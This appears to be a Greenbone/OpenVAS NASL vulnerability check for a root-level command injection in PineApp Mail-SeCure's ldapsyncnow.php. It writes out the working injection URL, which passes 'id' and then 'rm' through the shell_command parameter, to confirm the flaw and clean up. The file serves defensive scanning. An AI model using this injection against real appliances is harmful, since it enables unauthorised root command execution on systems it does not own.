if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103758" );
	script_bugtraq_id( 61474 );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "PineApp Mail-SeCure 'ldapsyncnow.php' Remote Command Injection Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/61474" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-08-13 11:34:56 +0200 (Tue, 13 Aug 2013)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 7443 );
	script_exclude_keys( "Settings/disable_cgi_scanning", "PineApp/missing" );
	script_tag( name: "impact", value: "Successful exploits will result in the execution of arbitrary commands
  with root privileges in the context of the affected appliance." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and check the response." );
	script_tag( name: "insight", value: "The specific flaw exists with input sanitization in the
  ldapsyncnow.php component. This flaw allows for the injection of arbitrary
  commands to the Mail-SeCure server. An attacker could leverage this
  vulnerability to execute arbitrary code as root." );
	script_tag( name: "solution", value: "Ask the Vendor for an update." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "PineApp Mail-SeCure is prone to a remote command-injection
  vulnerability." );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 7443 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
resp = http_get_cache( item: "/", port: port );
if(!resp || !ContainsString( resp, "PineApp" )){
	set_kb_item( name: "PineApp/missing", value: TRUE );
	exit( 0 );
}
vtstrings = get_vt_strings();
file = vtstrings["lowercase_rand"] + ".txt";
vuln_url = "/admin/ldapsyncnow.php?sync_now=1&shell_command=";
req = http_get( item: vuln_url + "id>./" + file + ";", port: port );
resp = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
req = http_get( item: "/admin/" + file, port: port );
resp = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
req = http_get( item: vuln_url + "rm%20./" + file + ";", port: port );
http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(IsMatchRegexp( resp, "uid=[0-9]+.*gid=[0-9]+.*" )){
	report = http_report_vuln_url( port: port, url: vuln_url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

